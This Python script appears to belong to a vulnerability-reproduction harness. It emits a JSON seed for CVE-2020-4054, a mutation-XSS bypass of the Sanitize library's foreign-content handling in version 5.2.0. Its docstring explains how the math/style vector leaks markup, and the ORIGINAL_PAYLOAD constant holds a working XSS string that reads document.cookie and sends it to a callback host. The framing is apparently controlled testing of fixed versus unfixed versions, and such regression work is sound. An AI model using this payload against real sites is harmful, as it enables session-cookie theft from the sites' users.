#!/usr/bin/env python3
"""[GIVEN] CVE-2020-4054 seed -- the <math>/<svg> foreign-content sanitization bypass in Sanitize.

Vector (Michał Bentkowski / Securitum, GHSA-p4x4-rw2p-8j8m): a non-allowlisted `<math>` (or `<svg>`)
foreign-content wrapper containing a `<style>` whose text smuggles an entity-encoded `</style>` and
`<img onerror>`. On V0 (sanitize 5.2.0) `math`/`svg` are NOT in the default config's `:remove_contents`
list, so when Sanitize strips the non-allowlisted `<math>` wrapper it LEAVES its contents behind; the
leaked markup, re-parsed by the browser outside the foreign-content context, becomes a live
`<img src=x onerror=...>` -> onerror fires on load -> reads document.cookie -> exfiltrates the flag to
the internal callback. Real execution.

On V1 (sanitize 5.2.1, the CVE-2020-4054 fix = TARGET) the default config's `:remove_contents` list
gained `math svg plaintext xmp` (commit for 5.2.1), so the whole `<math>` subtree -- contents
included -- is removed. Server-side output is '' -> nothing to re-parse -> BLOCKED (no flag).

Prints a JSON candidate for seed_exec; does not drive the victim itself.
"""
import json
import sys

# Internal compose callback the exfil payload navigates to (not a host port).
CB = "//callback:9000/c?f="

# Benign-canary variant of the advisory foreign-content mXSS: the re-parsed <img onerror> reads the
# victim's OWN cookie and posts it to the internal callback instead of alert(1). Carried through a
# non-allowlisted <math> wrapper -- the exact vector the 5.2.1 :remove_contents fix strips.
# (Upstream regression payload: `<math><style>/*&lt;/style&gt;&lt;img src onerror=alert(1)>*/`.)
ORIGINAL_PAYLOAD = (
    "<math><style>/*&lt;/style&gt;&lt;img src=x "
    "onerror=document.location='" + CB + "'+document.cookie>*/"
)


def candidate() -> dict:
    """JSON candidate for seed_exec: math/svg foreign-content seed (CVE-2020-4054)."""
    return {
        "probe_id": "cve-2020-4054-math-style-foreign-content",
        "payload": ORIGINAL_PAYLOAD,
        "mode": "load",
    }


if __name__ == "__main__":
    _ = sys.argv  # original_poc.py [version] — version is unused; seed_exec gets it separately
    print(json.dumps(candidate()))
